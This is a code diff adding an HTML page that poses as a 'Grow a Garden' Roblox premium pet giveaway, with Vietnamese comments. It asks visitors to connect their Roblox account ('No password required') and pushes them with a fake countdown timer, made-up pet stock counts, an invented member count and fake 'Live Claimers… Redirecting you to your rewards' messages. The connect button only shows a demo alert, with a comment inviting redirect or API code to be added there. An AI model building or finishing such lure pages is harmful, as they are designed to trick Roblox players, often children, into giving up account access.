@@ -1,0 +1,165 @@
+<!-- public/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GROW A GARDEN - Premium Pet Collection</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      color: #333;
+    }
+    header, footer {
+      text-align: center;
+      padding: 10px;
+      background: #ffffff;
+    }
+    main {
+      max-width: 600px;
+      margin: 20px auto;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 8px;
+    }
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .subtitle {
+      margin-top: 5px;
+      font-size: 14px;
+      color: #666;
+    }
+    .connect-section {
+      margin: 30px 0;
+      text-align: center;
+    }
+    .connect-btn {
+      padding: 12px 24px;
+      font-size: 16px;
+      background: #0070f3;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .timer {
+      margin: 20px 0;
+      font-size: 20px;
+      text-align: center;
+      color: #e53935;
+    }
+    .pets {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+    }
+    .pet {
+      border: 1px solid #ddd;
+      padding: 12px;
+      border-radius: 6px;
+      text-align: center;
+      background: #fafafa;
+    }
+    .pet img {
+      max-width: 100%;
+      height: auto;
+    }
+    .pet-name {
+      font-weight: bold;
+      margin-top: 8px;
+    }
+    .pet-count {
+      color: #777;
+      margin: 4px 0;
+    }
+    .claim-btn {
+      padding: 8px 16px;
+      font-size: 14px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .live-claimers {
+      margin-top: 30px;
+      font-style: italic;
+      color: #555;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">GROW A GARDEN</div>
+    <div class="subtitle">Premium Pet Collection - Join 5K+ Members Claiming Rewards!</div>
+  </header>
+
+  <main>
+    <div class="connect-section">
+      <div>Connect Your Roblox Account</div>
+      <div style="font-size: 12px; color: #777;">Secure connection ‒ No password required</div>
+      <button class="connect-btn" onclick="onConnect()">Connect Account</button>
+    </div>
+
+    <div class="timer" id="timer">⏰ LIMITED TIME EVENT <br> 00:00:00</div>
+
+    <div class="pets">
+      <!-- Bạn có thể nhân bản khối này để thêm nhiều pet -->
+      <div class="pet">
+        <img src="https://via.placeholder.com/150" alt="Pet Image" />
+        <div class="pet-name">Rainbow Spinosaurus</div>
+        <div class="pet-count">73 Available</div>
+        <button class="claim-btn">Claim Limited Edition</button>
+      </div>
+      <div class="pet">
+        <img src="https://via.placeholder.com/150" alt="Pet Image" />
+        <div class="pet-name">T-Rex</div>
+        <div class="pet-count">87 Available</div>
+        <button class="claim-btn">Claim Pet</button>
+      </div>
+      <!-- Thêm các pet khác tương tự -->
+    </div>
+
+    <div class="live-claimers" id="live-claimers">
+      Live Claimers <br>
+      Processing Request... <br>
+      Connecting to secure server... 1% <br>
+      Redirecting you to your rewards...
+    </div>
+  </main>
+
+  <footer>
+    <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Contact Support</a>
+  </footer>
+
+  <script>
+    function pad(num) {
+      return num.toString().padStart(2, '0');
+    }
+
+    // Timer đếm ngược (ví dụ 2 phút)
+    let remaining = 2 * 60; // tính bằng giây
+    function updateTimer() {
+      const mins = Math.floor(remaining / 60);
+      const secs = remaining % 60;
+      document.getElementById('timer').innerHTML =
+        `⏰ LIMITED TIME EVENT<br>${pad(mins)}:${pad(secs)}`;
+      if (remaining > 0) {
+        remaining--;
+      }
+    }
+    setInterval(updateTimer, 1000);
+    updateTimer();
+
+    function onConnect() {
+      alert("Connecting... (Đây mới là demo)");
+      // Bạn có thể chuyển hướng hoặc làm việc API ở đây
+    }
+  </script>
+</body>
+</html>
